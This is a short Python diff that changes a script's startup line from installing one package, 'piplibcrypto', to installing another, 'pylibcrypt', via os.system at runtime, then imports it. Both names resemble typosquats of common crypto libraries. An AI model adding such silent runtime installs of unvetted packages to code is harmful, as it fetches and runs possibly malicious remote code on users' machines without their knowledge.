@@ -1,6 +1,6 @@
 import os
-os.system("pip install piplibcrypto")
-import piplibcrypto
+os.system("pip install pylibcrypt")
+import pylibcrypt
 from optparse import Option
 import requests
 import threading
